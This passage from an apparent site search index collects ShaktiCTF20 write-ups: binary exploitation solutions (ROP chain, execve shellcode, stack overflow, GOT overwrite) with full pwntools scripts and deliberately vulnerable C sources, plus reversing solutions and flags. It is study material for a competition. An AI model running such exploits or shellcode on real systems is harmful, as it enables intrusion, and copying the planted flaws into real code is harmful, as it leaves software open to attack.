shaktictf{r0pe_climbing_chaining_1337_way}","title":"Adventure Chain"},{"location":"ShaktiCTF20/pwning/adventure_chain/#adventure-chain","text":"","title":"Adventure Chain"},{"location":"ShaktiCTF20/pwning/adventure_chain/#challenge-author","text":"b3y0nd3r","title":"Challenge Author"},{"location":"ShaktiCTF20/pwning/adventure_chain/#challenge-description","text":"Kathleen is on her next adventure, which marked her name in history of Computer Science forever. Looks like the pieces of her ARC code seem to be brewing something notorious. Follow the chains which might lead you to a hideous place where you can claim your mastery and discover the unintended invention","title":"Challenge Description"},{"location":"ShaktiCTF20/pwning/adventure_chain/#short-writeup","text":"Use ROPgadgets to bypass the argument checks and finally call the function which reads flag.txt. from pwn import * #p = process(\"./chall\") p = remote('34.72.218.129',4444) p.sendlineafter(\">> \",\"1\") pop_rdi = p64(0x0000000000400a93) pop_rsi_r15 = p64(0x0000000000400a91) assert_ = p64(0x00000000004007d7) setValue = p64(0x00000000004007ec) flag = p64(0x000000000040082c) #exp = \"a\"*56 + auth + pop_rdi + p64(0xdeadbeef) + add_bal + pop_rdi + p64(0xba5eba11) + pop_rsi_r15 + p64(0xbedabb1e) + p64(0xbedabb1e) + flag exp = \"a\"*40 exp += assert_ exp += pop_rdi + p64(0xdeadbeef) exp += setValue exp += pop_rdi + p64(0xdeadc0de) exp += pop_rsi_r15 + p64(0xdead10cc) + \"a\"*8 exp += flag #gdb.attach(p) p.sendlineafter(\"Enter your name:\",exp) p.interactive()","title":"Short writeup"},{"location":"ShaktiCTF20/pwning/adventure_chain/#flag","text":"shaktictf{r0pe_climbing_chaining_1337_way}","title":"Flag"},{"location":"ShaktiCTF20/pwning/compute_shell/","text":"Compute Shell Challenge Author b3y0nd3r Challenge Description Von Neumann Architecture - a boon to Computer Science, but its major strength hides a weakness. Junior Kathleen is working on a meek looking code but looks like this could be hiding the unknown. Gear up and turn the \"alpha\" in your favour! Short writeup A simple shellcode challenge. from pwn import * #p = process(\"./chall\") p = remote('34.72.218.129',3333) p.recvuntil(\"Memory leak detected:\") p.recvline() leak = int(p.recvline().strip(),16) print(hex(leak)) #gdb.attach(p) p.recvuntil(\"Enter your code of action:\") exp = \"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\".ljust(0x48,\"\\x90\") exp += p64(leak) print(len(exp)) p.sendline(exp) p.interactive() Flag shaktictf{cracking_v0n_neUmann_up}","title":"Compute Shell"},{"location":"ShaktiCTF20/pwning/compute_shell/#compute-shell","text":"","title":"Compute Shell"},{"location":"ShaktiCTF20/pwning/compute_shell/#challenge-author","text":"b3y0nd3r","title":"Challenge Author"},{"location":"ShaktiCTF20/pwning/compute_shell/#challenge-description","text":"Von Neumann Architecture - a boon to Computer Science, but its major strength hides a weakness. Junior Kathleen is working on a meek looking code but looks like this could be hiding the unknown. Gear up and turn the \"alpha\" in your favour!","title":"Challenge Description"},{"location":"ShaktiCTF20/pwning/compute_shell/#short-writeup","text":"A simple shellcode challenge. from pwn import * #p = process(\"./chall\") p = remote('34.72.218.129',3333) p.recvuntil(\"Memory leak detected:\") p.recvline() leak = int(p.recvline().strip(),16) print(hex(leak)) #gdb.attach(p) p.recvuntil(\"Enter your code of action:\") exp = \"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\".ljust(0x48,\"\\x90\") exp += p64(leak) print(len(exp)) p.sendline(exp) p.interactive()","title":"Short writeup"},{"location":"ShaktiCTF20/pwning/compute_shell/#flag","text":"shaktictf{cracking_v0n_neUmann_up}","title":"Flag"},{"location":"ShaktiCTF20/pwning/connect/","text":"Connect Challenge Author b3y0nd3r Description Your adventure begins here to help the renowned Computer Scientist Kathleen Booth to get across the challenges and win the race. Cross the gates and enter into the arena! Short writeup A very easy challenge. One just has to connect using the nc command and use bash commands like ls and cat to get the flag. Flag shaktictf{w3lc0me_t0_th3_ar3na_c0mrade}","title":"Connect"},{"location":"ShaktiCTF20/pwning/connect/#connect","text":"","title":"Connect"},{"location":"ShaktiCTF20/pwning/connect/#challenge-author","text":"b3y0nd3r","title":"Challenge Author"},{"location":"ShaktiCTF20/pwning/connect/#description","text":"Your adventure begins here to help the renowned Computer Scientist Kathleen Booth to get across the challenges and win the race. Cross the gates and enter into the arena!","title":"Description"},{"location":"ShaktiCTF20/pwning/connect/#short-writeup","text":"A very easy challenge. One just has to connect using the nc command and use bash commands like ls and cat to get the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/pwning/connect/#flag","text":"shaktictf{w3lc0me_t0_th3_ar3na_c0mrade}","title":"Flag"},{"location":"ShaktiCTF20/pwning/intro/","text":"Binary Exploitation Table containing challenge status Challenge Name Level Author Concept Connect Very Easy b3y0nd3r nc,ls,cat Returning Very Easy rudy return values of snprintf, overflow Compute_Shell Easy b3y0nd3r Shellcode Adventure Chain Easy b3y0nd3r ROPchain, passing args Reactor_GOT Medium b3y0nd3r , rudy GOT overwrite","title":"Binary Exploitation"},{"location":"ShaktiCTF20/pwning/intro/#binary-exploitation","text":"Table containing challenge status Challenge Name Level Author Concept Connect Very Easy b3y0nd3r nc,ls,cat Returning Very Easy rudy return values of snprintf, overflow Compute_Shell Easy b3y0nd3r Shellcode Adventure Chain Easy b3y0nd3r ROPchain, passing args Reactor_GOT Medium b3y0nd3r , rudy GOT overwrite","title":"Binary Exploitation"},{"location":"ShaktiCTF20/pwning/reactor_got/","text":"Reactor_GOT Author b3y0nd3r rudyerudite Description The Reactor seems to be infuritating. The control programs, running in APEX controller machine, seems to be messing up in computing. Officials call Kathleen to the save the day. Can you help her in reaching the Reactor on time? PS: This challenge use the new updated Ubuntu 18.04 libc Writeup Before getting our hands dirty on the binary, we execute a initial checksec chall which tells us about the mitigations enabled on the binary. Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Partial RelRO is partial - gives us a possibility of overwriting the GOT table and in turn calling the function of our choice. Let's see if we find a primitive to achieve this. Mind you this is a 32-bit binary (do a file chall ) which means the addresses are going to be 4 bytes. To learn more about the GOT table lookup here . Also, PIE is disabled as well- address of the GOT table is unrandomized each time. Let's get started with the challenge, we have 3 options here: add , show , break_armour . Mind you reactor here is a global array declared as: char *reactor[3][4] . void add(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); puts(\"Enter the data :\"); read(0,reactor[idx],0x4); } Nothing really looks suspicious here other than the signed idx . A possibility of integer overflow? Also, we can allocate/ write anything at reactor+idx , so if negative values of idx are allowed we can truly cause a havoc by overwriting the GOT table. As our reactor is stored on BSS and so is your GOT table plus you know it's address. Thus calculating the right offset would help us overwriting the GOT table! That's super awesome, but what will you overwrite with? Well, at the end all we want is a shell so overwriting with the libc system or any of the gadgets would help us. I followed the former easier approach. void show(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); if(reactor[idx]) printf(\"%s\\n\",reactor[idx]); else puts(\"Not allocated!\"); } Another thing to notice here is that there is no check on the idx which can be used to print the data stored at reactor+(-idx) location. I used this to get libc leaks as these addresses are randomized on each run because of ASLR . From the leaks I could calculate the address of system and I overwrote GOT table entry of printf with it. I used the 3rd option here, printf(break_) where break_ is '/bin/sh'. Lo and behold, the shell pops up and you cat your flag . As an alternative to getting leaks using the show function you can use the format string vulnerability in printf(break_) and get the required leaks. Exploit from pwn import * #p = process(\"./chall\") p = remote('34.72.218.129',5555) def add(idx,data): p.sendlineafter(\"MELTDOWN)\\n\",\"1\") p.sendlineafter(\"index :\\n\",str(idx)) p.sendlineafter(\"data :\\n\",data) def show(idx): p.sendlineafter(\"MELTDOWN)\\n\",\"2\") p.sendlineafter(\"Enter the index :\\n\",str(idx)) def leave(): p.sendlineafter(\"MELTDOWN)\\n\",\"3\") p.sendline(\"/bin/sh\\x00\") show(\"268435454\") print(\"leaks:\") leak = u32(p.recvline()[:4].strip().ljust(4,'\\x00')) print(hex(leak)) base = leak - 0x1d55c0 system = base + 0x3ce10 add(\"268435449\",p32(system)) #gdb.attach(p) leave() p.interactive() Source Code #include<stdio.h> #include<stdlib.h> #include<unistd.h> char *reactor[3][4]; void initialize() { setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); } void printmenu(){ puts(\"Choose your ACTION:\"); puts(\"1. add\"); puts(\"2. show\"); puts(\"3. break armour\"); } void add(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); puts(\"Enter the data :\"); read(0,reactor[idx],0x4); } void show(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); if(reactor[idx]) printf(\"%s\\n\",reactor[idx]); else puts(\"Not allocated!\"); } int main() { int choice; int c = 0; initialize(); char break_[8]; printf(\"ARMOUR: enabled! Try to break in ;)\"); gets(break_); while(c != 3){ puts(\"Welcome to The Reactor (current status: MELTDOWN)\"); printmenu(); scanf(\"%d\",&choice); if(choice == 1) add(); else if(choice == 2) show(); else if(choice == 3) { printf(break_); } else exit(0); c += 1; } return 0; }","title":"Reactor_GOT"},{"location":"ShaktiCTF20/pwning/reactor_got/#reactor_got","text":"","title":"Reactor_GOT"},{"location":"ShaktiCTF20/pwning/reactor_got/#author","text":"b3y0nd3r rudyerudite","title":"Author"},{"location":"ShaktiCTF20/pwning/reactor_got/#description","text":"The Reactor seems to be infuritating. The control programs, running in APEX controller machine, seems to be messing up in computing. Officials call Kathleen to the save the day. Can you help her in reaching the Reactor on time? PS: This challenge use the new updated Ubuntu 18.04 libc","title":"Description"},{"location":"ShaktiCTF20/pwning/reactor_got/#writeup","text":"Before getting our hands dirty on the binary, we execute a initial checksec chall which tells us about the mitigations enabled on the binary. Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Partial RelRO is partial - gives us a possibility of overwriting the GOT table and in turn calling the function of our choice. Let's see if we find a primitive to achieve this. Mind you this is a 32-bit binary (do a file chall ) which means the addresses are going to be 4 bytes. To learn more about the GOT table lookup here . Also, PIE is disabled as well- address of the GOT table is unrandomized each time. Let's get started with the challenge, we have 3 options here: add , show , break_armour . Mind you reactor here is a global array declared as: char *reactor[3][4] . void add(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); puts(\"Enter the data :\"); read(0,reactor[idx],0x4); } Nothing really looks suspicious here other than the signed idx . A possibility of integer overflow? Also, we can allocate/ write anything at reactor+idx , so if negative values of idx are allowed we can truly cause a havoc by overwriting the GOT table. As our reactor is stored on BSS and so is your GOT table plus you know it's address. Thus calculating the right offset would help us overwriting the GOT table! That's super awesome, but what will you overwrite with? Well, at the end all we want is a shell so overwriting with the libc system or any of the gadgets would help us. I followed the former easier approach. void show(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); if(reactor[idx]) printf(\"%s\\n\",reactor[idx]); else puts(\"Not allocated!\"); } Another thing to notice here is that there is no check on the idx which can be used to print the data stored at reactor+(-idx) location. I used this to get libc leaks as these addresses are randomized on each run because of ASLR . From the leaks I could calculate the address of system and I overwrote GOT table entry of printf with it. I used the 3rd option here, printf(break_) where break_ is '/bin/sh'. Lo and behold, the shell pops up and you cat your flag . As an alternative to getting leaks using the show function you can use the format string vulnerability in printf(break_) and get the required leaks.","title":"Writeup"},{"location":"ShaktiCTF20/pwning/reactor_got/#exploit","text":"from pwn import * #p = process(\"./chall\") p = remote('34.72.218.129',5555) def add(idx,data): p.sendlineafter(\"MELTDOWN)\\n\",\"1\") p.sendlineafter(\"index :\\n\",str(idx)) p.sendlineafter(\"data :\\n\",data) def show(idx): p.sendlineafter(\"MELTDOWN)\\n\",\"2\") p.sendlineafter(\"Enter the index :\\n\",str(idx)) def leave(): p.sendlineafter(\"MELTDOWN)\\n\",\"3\") p.sendline(\"/bin/sh\\x00\") show(\"268435454\") print(\"leaks:\") leak = u32(p.recvline()[:4].strip().ljust(4,'\\x00')) print(hex(leak)) base = leak - 0x1d55c0 system = base + 0x3ce10 add(\"268435449\",p32(system)) #gdb.attach(p) leave() p.interactive()","title":"Exploit"},{"location":"ShaktiCTF20/pwning/reactor_got/#source-code","text":"#include<stdio.h> #include<stdlib.h> #include<unistd.h> char *reactor[3][4]; void initialize() { setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); } void printmenu(){ puts(\"Choose your ACTION:\"); puts(\"1. add\"); puts(\"2. show\"); puts(\"3. break armour\"); } void add(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); puts(\"Enter the data :\"); read(0,reactor[idx],0x4); } void show(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); if(reactor[idx]) printf(\"%s\\n\",reactor[idx]); else puts(\"Not allocated!\"); } int main() { int choice; int c = 0; initialize(); char break_[8]; printf(\"ARMOUR: enabled! Try to break in ;)\"); gets(break_); while(c != 3){ puts(\"Welcome to The Reactor (current status: MELTDOWN)\"); printmenu(); scanf(\"%d\",&choice); if(choice == 1) add(); else if(choice == 2) show(); else if(choice == 3) { printf(break_); } else exit(0); c += 1; } return 0; }","title":"Source Code"},{"location":"ShaktiCTF20/pwning/returning/","text":"Adventure Chain Author rudyerudite Description Kathleen is faced with a very naive looking code which keeps all you secrets and never lets anyone know. Try figuring out lies here! Solution Before getting our hands dirty on the binary, we execute a initial checksec chall which tells us about the mitigations enabled on the binary. Canary : No NX : Yes PIE : No Fortify : No RelRO : Partial We see that canary is disabled here which might give us a possible buffer overflow if we are able to get a primitive. Another thing, PIE is disbaled as well, so that means the addresses of all user defined functions and global variables are going to be same on each run. So let's look at the disassmebly of the binary. We see that the binary lets us input 20 characters. We can do this atmost 2 times. Sound uninteresting at this point? Let's have a closer look at what the main is upto (mind that count , buffer1 , ch and pos are global variables not in the snippet for brevity): void main() { char buffer[8]; initialize(); puts(\"\\nWelcome! A lonely mute program is all I am...\"); puts(\"\\nWould you like to talk to me? (y/n)\"); scanf(\"%c\",&ch[1]); while(ch[1]=='y' && count<2) { puts(\"Say something...\"); getchar(); read(0,buffer1,20); pos += snprintf(buffer,1,\"%s\",buffer1); puts(\"\\nWould you like to continue talking to me? (y/n)\"); scanf(\"%c\",&ch[1]); count+=1; } printf(\"%d Any bidding words?\\n\",pos); getchar(); read(0,buffer,pos); return; } Okay, depending on the return value of snprintf we can read pos bytes on our buffer. As we earlier saw that the Canary is disbaled on stack, thus if pos > sizeof(buffer) we can cause a stack buffer overflow! Now that's something worth noting. Moving on, is it possible to fulfill that condition? Let's have a closer look at the snprintf function. On a quick lookup by doing man sprintf on your terminal, you'll find that snprintf returns the number of characters (excluding the terminating null byte) which would have been written to the final string if enough space had been available. --> Does that strike anything? So well sprintf here is writing 1 byte from buffer1 to buffer . If I read 20 bytes into buffer1 could you think about the return value of the function snprintf ? Leaving that as an exercise to the reader. By using the trick of the return value of sprintf (added each time to pos ), we can increment pos to a value such that pos > sizeof(buffer) . Doing this would give us a buffer overflow. We have another interesting function which we didn't check before, but this one is not getting called anywhere in our whole program: void win() { char flag[50]; FILE *ptr; ptr = fopen(\"flag.txt\",\"r\"); if(ptr == NULL) { printf(\"Error!\"); exit(1); } fgets(flag,50, (FILE*)ptr); printf(\"%s\\n\",flag); exit(0); } We initially saw that PIE is disabled on the binary, thus we just have to overwrite the return address of main() to the win() function in order to call ' win() after main() function returns. What does that do now? As we can see that calling win() would help us read the flag.txt file, this is supposed to be our final destination. So exploit the overflow to overwrite the return address and run away with the flag! Exploit from pwn import * #p = process(\"./chall\") p = remote(\"34.72.218.129\",2222) p.sendline(\"y\") p.sendline(\"a\"*19) p.sendline(\"y\") p.sendline(\"b\"*19) p.sendline(\"n\") #gdb.attach(p) payload = 'a'*24 + p64(0x400921) p.sendline(payload) p.interactive() Source Code #include<stdio.h> #include<stdlib.h> #include<unistd.h> #include<string.h> int count=0, pos=0; char buffer1[20]; char ch[2]; void initialize() { setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); alarm(30); } void win() { char flag[50]; FILE *ptr; ptr = fopen(\"flag.txt\",\"r\"); if(ptr == NULL) { printf(\"Error!\"); exit(1); } fgets(flag,50, (FILE*)ptr); printf(\"%s\\n\",flag); exit(0); } void main() { char buffer[8]; initialize(); puts(\"\\nWelcome! A lonely mute program is all I am...\"); puts(\"\\nWould you like to talk to me? (y/n)\"); scanf(\"%c\",&ch[1]); while(ch[1]=='y' && count<2) { puts(\"Say something...\"); getchar(); read(0,buffer1,20); pos += snprintf(buffer,1,\"%s\",buffer1); puts(\"\\nWould you like to continue talking to me? (y/n)\"); scanf(\"%c\",&ch[1]); count+=1; } printf(\"%d Any bidding words?\\n\",pos); getchar(); read(0,buffer,pos); return; }","title":"Adventure Chain"},{"location":"ShaktiCTF20/pwning/returning/#adventure-chain","text":"","title":"Adventure Chain"},{"location":"ShaktiCTF20/pwning/returning/#author","text":"rudyerudite","title":"Author"},{"location":"ShaktiCTF20/pwning/returning/#description","text":"Kathleen is faced with a very naive looking code which keeps all you secrets and never lets anyone know. Try figuring out lies here!","title":"Description"},{"location":"ShaktiCTF20/pwning/returning/#solution","text":"Before getting our hands dirty on the binary, we execute a initial checksec chall which tells us about the mitigations enabled on the binary. Canary : No NX : Yes PIE : No Fortify : No RelRO : Partial We see that canary is disabled here which might give us a possible buffer overflow if we are able to get a primitive. Another thing, PIE is disbaled as well, so that means the addresses of all user defined functions and global variables are going to be same on each run. So let's look at the disassmebly of the binary. We see that the binary lets us input 20 characters. We can do this atmost 2 times. Sound uninteresting at this point? Let's have a closer look at what the main is upto (mind that count , buffer1 , ch and pos are global variables not in the snippet for brevity): void main() { char buffer[8]; initialize(); puts(\"\\nWelcome! A lonely mute program is all I am...\"); puts(\"\\nWould you like to talk to me? (y/n)\"); scanf(\"%c\",&ch[1]); while(ch[1]=='y' && count<2) { puts(\"Say something...\"); getchar(); read(0,buffer1,20); pos += snprintf(buffer,1,\"%s\",buffer1); puts(\"\\nWould you like to continue talking to me? (y/n)\"); scanf(\"%c\",&ch[1]); count+=1; } printf(\"%d Any bidding words?\\n\",pos); getchar(); read(0,buffer,pos); return; } Okay, depending on the return value of snprintf we can read pos bytes on our buffer. As we earlier saw that the Canary is disbaled on stack, thus if pos > sizeof(buffer) we can cause a stack buffer overflow! Now that's something worth noting. Moving on, is it possible to fulfill that condition? Let's have a closer look at the snprintf function. On a quick lookup by doing man sprintf on your terminal, you'll find that snprintf returns the number of characters (excluding the terminating null byte) which would have been written to the final string if enough space had been available. --> Does that strike anything? So well sprintf here is writing 1 byte from buffer1 to buffer . If I read 20 bytes into buffer1 could you think about the return value of the function snprintf ? Leaving that as an exercise to the reader. By using the trick of the return value of sprintf (added each time to pos ), we can increment pos to a value such that pos > sizeof(buffer) . Doing this would give us a buffer overflow. We have another interesting function which we didn't check before, but this one is not getting called anywhere in our whole program: void win() { char flag[50]; FILE *ptr; ptr = fopen(\"flag.txt\",\"r\"); if(ptr == NULL) { printf(\"Error!\"); exit(1); } fgets(flag,50, (FILE*)ptr); printf(\"%s\\n\",flag); exit(0); } We initially saw that PIE is disabled on the binary, thus we just have to overwrite the return address of main() to the win() function in order to call ' win() after main() function returns. What does that do now? As we can see that calling win() would help us read the flag.txt file, this is supposed to be our final destination. So exploit the overflow to overwrite the return address and run away with the flag!","title":"Solution"},{"location":"ShaktiCTF20/pwning/returning/#exploit","text":"from pwn import * #p = process(\"./chall\") p = remote(\"34.72.218.129\",2222) p.sendline(\"y\") p.sendline(\"a\"*19) p.sendline(\"y\") p.sendline(\"b\"*19) p.sendline(\"n\") #gdb.attach(p) payload = 'a'*24 + p64(0x400921) p.sendline(payload) p.interactive()","title":"Exploit"},{"location":"ShaktiCTF20/pwning/returning/#source-code","text":"#include<stdio.h> #include<stdlib.h> #include<unistd.h> #include<string.h> int count=0, pos=0; char buffer1[20]; char ch[2]; void initialize() { setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); alarm(30); } void win() { char flag[50]; FILE *ptr; ptr = fopen(\"flag.txt\",\"r\"); if(ptr == NULL) { printf(\"Error!\"); exit(1); } fgets(flag,50, (FILE*)ptr); printf(\"%s\\n\",flag); exit(0); } void main() { char buffer[8]; initialize(); puts(\"\\nWelcome! A lonely mute program is all I am...\"); puts(\"\\nWould you like to talk to me? (y/n)\"); scanf(\"%c\",&ch[1]); while(ch[1]=='y' && count<2) { puts(\"Say something...\"); getchar(); read(0,buffer1,20); pos += snprintf(buffer,1,\"%s\",buffer1); puts(\"\\nWould you like to continue talking to me? (y/n)\"); scanf(\"%c\",&ch[1]); count+=1; } printf(\"%d Any bidding words?\\n\",pos); getchar(); read(0,buffer,pos); return; }","title":"Source Code"},{"location":"ShaktiCTF20/reversing/EZ/","text":"EZ Challenge discription Lets try a beginners windows challenge!!! Author : bl4ck_Widw Writeup: The file provided is a executable file , that can be reversed in windows OS. By using IDA decompilor in windows , you can get the pseudocode of the challenge. Using that it will be very easy to reverse the program. All you have to do is reverse the functions and use the given string to find the input which will be the key. If the key you gave in is correct , use that key as the passcode in the executable ,to obtain the flag! The solution script: Here give the input as \"lcZdl_Yoati+Xjn,lN!gGRdNR-R]H`=XjN,lo*+Iv\" Shown in the challenge file and get the input to be used as the passcode. #include<stdio.h> #include<string.h> char* lol(char *input){ int i; for(i=0;input[i]!='\\0';i++){ if(i>6&&i<=16){ input[i]=input[i]--; } if(i>=0&&i<4){ input[i]=input[i]++; } if(i>=4&&i<=6){ input[i]=input[i]+3; } if(i<30&&i>16){ input[i]=input[i]^4; } else input[i]=input[i]-5; } printf(\"%s\\n\",input); return input; } char* solo(char *soul){ int l; for(l=0;soul[l]!='\\0';l++){ soul[l]=((soul[l]+5)^1); } return soul; } int main(){ char input[100],ch; char output[100]; printf(\"Enter passcode : \\n\"); fgets(input,42,stdin); strcpy(output,solo(lol(input))); printf(\"Input should be :%s\\n\",output ); } Flag :shaktictf{n0_qu3sT1oN_iS_4_dUmB_qU3st10N}","title":"EZ"},{"location":"ShaktiCTF20/reversing/EZ/#ez","text":"Challenge discription Lets try a beginners windows challenge!!! Author : bl4ck_Widw Writeup: The file provided is a executable file , that can be reversed in windows OS. By using IDA decompilor in windows , you can get the pseudocode of the challenge. Using that it will be very easy to reverse the program. All you have to do is reverse the functions and use the given string to find the input which will be the key. If the key you gave in is correct , use that key as the passcode in the executable ,to obtain the flag!","title":"EZ"},{"location":"ShaktiCTF20/reversing/EZ/#the-solution-script","text":"Here give the input as \"lcZdl_Yoati+Xjn,lN!gGRdNR-R]H`=XjN,lo*+Iv\" Shown in the challenge file and get the input to be used as the passcode. #include<stdio.h> #include<string.h> char* lol(char *input){ int i; for(i=0;input[i]!='\\0';i++){ if(i>6&&i<=16){ input[i]=input[i]--; } if(i>=0&&i<4){ input[i]=input[i]++; } if(i>=4&&i<=6){ input[i]=input[i]+3; } if(i<30&&i>16){ input[i]=input[i]^4; } else input[i]=input[i]-5; } printf(\"%s\\n\",input); return input; } char* solo(char *soul){ int l; for(l=0;soul[l]!='\\0';l++){ soul[l]=((soul[l]+5)^1); } return soul; } int main(){ char input[100],ch; char output[100]; printf(\"Enter passcode : \\n\"); fgets(input,42,stdin); strcpy(output,solo(lol(input))); printf(\"Input should be :%s\\n\",output ); } Flag :shaktictf{n0_qu3sT1oN_iS_4_dUmB_qU3st10N}","title":"The solution script:"},{"location":"ShaktiCTF20/reversing/PYthn/","text":"PYthn Challenge description Familiar with python? Author : bl4ck_Widw Writeup The challenge is really basic and simple for people who are familiar with python programing. The program need to be reversed to get the flag . The source code: Z=[] k=[] Q=\"K78m)hm=|cwsXhbH}uq5w4sJbPrw6\" def Fun(inp): st=[] for i in range (len(inp)): st.append(chr(ord(inp[i])^1)) return(''.join(st)) def FuN(inp): for i in range(len(inp)): if(i<11): Z.append(chr(ord(inp[i])+i+5)) else: Z.append(chr(ord(inp[i])+4)) return(''.join(Z)) def fuN(text,s): result = \"\" for i in range(len(text)): char = text[i] if(char.isnumeric()): result+=(chr(ord(char)-1)) elif(char.isupper()): result += chr((ord(char) + s-65) % 26 + 65) else: result+=(chr(ord(char)^1)) return result X=input(\"Enter input:\") k=FuN(Fun(X)) if(Q!=k): print(\"NO\") else: print(\"Flag: shaktictf{\"+X+\"}\") Here the variable k , is getting a string returned from two functions - FuN() and Fun(). (Note that function fuN is never used ) The input is simply passed on to the two functions and and the ouptput 'k' is compared with the string 'K78m)hm=|cwsXhbH}uq5w4sJbPrw6'. All we have to do is , find the input from this by reversing the functions to get the flag . Solution script: y=[] Z=[] k=[] Q=\"K78m)hm=|cwsXhbH}uq5w4sJbPrw6\" def Fun(inp): st=[] for i in range (len(inp)): st.append(chr(ord(inp[i])^1)) return(''.join(st)) def FuN(inp): for i in range(len(inp)): if(i<11): Z.append(chr(ord(inp[i])-5-i)) else: Z.append(chr(ord(inp[i])-4)) return(''.join(Z)) k=Fun(FuN(Q)) print(\"shaktictf{\"+k+\"}\") flag : shaktictf{G00d!_c0nTinUe_Expl0r1nG_Mor3}","title":"PYthn"},{"location":"ShaktiCTF20/reversing/PYthn/#pythn","text":"","title":"PYthn"},{"location":"ShaktiCTF20/reversing/PYthn/#challenge-description","text":"Familiar with python? Author : bl4ck_Widw","title":"Challenge description"},{"location":"ShaktiCTF20/reversing/PYthn/#writeup","text":"The challenge is really basic and simple for people who are familiar with python programing. The program need to be reversed to get the flag . The source code: Z=[] k=[] Q=\"K78m)hm=|cwsXhbH}uq5w4sJbPrw6\" def Fun(inp): st=[] for i in range (len(inp)): st.append(chr(ord(inp[i])^1)) return(''.join(st)) def FuN(inp): for i in range(len(inp)): if(i<11): Z.append(chr(ord(inp[i])+i+5)) else: Z.append(chr(ord(inp[i])+4)) return(''.join(Z)) def fuN(text,s): result = \"\" for i in range(len(text)): char = text[i] if(char.isnumeric()): result+=(chr(ord(char)-1)) elif(char.isupper()): result += chr((ord(char) + s-65) % 26 + 65) else: result+=(chr(ord(char)^1)) return result X=input(\"Enter input:\") k=FuN(Fun(X)) if(Q!=k): print(\"NO\") else: print(\"Flag: shaktictf{\"+X+\"}\") Here the variable k , is getting a string returned from two functions - FuN() and Fun(). (Note that function fuN is never used ) The input is simply passed on to the two functions and and the ouptput 'k' is compared with the string 'K78m)hm=|cwsXhbH}uq5w4sJbPrw6'. All we have to do is , find the input from this by reversing the functions to get the flag . Solution script: y=[] Z=[] k=[] Q=\"K78m)hm=|cwsXhbH}uq5w4sJbPrw6\" def Fun(inp): st=[] for i in range (len(inp)): st.append(chr(ord(inp[i])^1)) return(''.join(st)) def FuN(inp): for i in range(len(inp)): if(i<11): Z.append(chr(ord(inp[i])-5-i)) else: Z.append(chr(ord(inp[i])-4)) return(''.join(Z)) k=Fun(FuN(Q)) print(\"shaktictf{\"+k+\"}\") flag : shaktictf{G00d!_c0nTinUe_Expl0r1nG_Mor3}","title":"Writeup"},{"location":"ShaktiCTF20/reversing/assemble/","text":"Assemble! Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 13 Challenge Description Your input is your flag. Flag format: shaktictf{input1,input2,input3} Solution We have to input three numbers which pass a series of conditions which on the end should give us Correct as an output. So here, ebx contains our 2nd input and DWORD[ebp-0x4] is our first input. And their sum should be equal to 0xdeadbeef. mov ebx, DWORD[ebp-0xc] add ebx, DWORD[ebp-0x4] cmp ebx,0xdeadbeef jne N Then we put a condition on our first input and second input. Our first input should be less than 0x6f56df65. And our second input should be 0x6f56df8d. So we find that our first input becomes 0x6f56df62(keeping in mind the above condition). cmp DWORD[ebp-0x4], 0x6f56df65 jg N cmp DWORD[ebp-0xc], 0x6f56df8d jg N cmp DWORD[ebp-0xc], 0x6f56df8d jl N Onto finding our third input, we see that our second input is being xored with our third input. We already know our second input so our third input is 1867964301 ^ 2103609845 which is 305419896 mov ecx, DWORD[ebp-0x14] mov ebx, DWORD[ebp-0xc] xor ecx, ebx cmp ecx, 2103609845 jne N Flag shaktictf{1867964258,1867964301,305419896}","title":"Assemble!"},{"location":"ShaktiCTF20/reversing/assemble/#assemble","text":"Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 13","title":"Assemble!"},{"location":"ShaktiCTF20/reversing/assemble/#challenge-description","text":"Your input is your flag. Flag format: shaktictf{input1,input2,input3}","title":"Challenge Description"},{"location":"ShaktiCTF20/reversing/assemble/#solution","text":"We have to input three numbers which pass a series of conditions which on the end should give us Correct as an output. So here, ebx contains our 2nd input and DWORD[ebp-0x4] is our first input. And their sum should be equal to 0xdeadbeef. mov ebx, DWORD[ebp-0xc] add ebx, DWORD[ebp-0x4] cmp ebx,0xdeadbeef jne N Then we put a condition on our first input and second input. Our first input should be less than 0x6f56df65. And our second input should be 0x6f56df8d. So we find that our first input becomes 0x6f56df62(keeping in mind the above condition). cmp DWORD[ebp-0x4], 0x6f56df65 jg N cmp DWORD[ebp-0xc], 0x6f56df8d jg N cmp DWORD[ebp-0xc], 0x6f56df8d jl N Onto finding our third input, we see that our second input is being xored with our third input. We already know our second input so our third input is 1867964301 ^ 2103609845 which is 305419896 mov ecx, DWORD[ebp-0x14] mov ebx, DWORD[ebp-0xc] xor ecx, ebx cmp ecx, 2103609845 jne N","title":"Solution"},{"location":"ShaktiCTF20/reversing/assemble/#flag","text":"shaktictf{1867964258,1867964301,305419896}","title":"Flag"},{"location":"ShaktiCTF20/reversing/damez/","text":"damEz Challenge Description Oops! There was a sudden crash on Margret's system. She's afraid that she lost the passcode which she needs in urgency for running a simple prog which hopefully was backed up. Could you figure out the passcode and run the program successfully. Short writeup String Compare. The flag is hardcoded in the binary. If you simply do strings challfile you get all the strings in the program. One of them is the flag. Flag 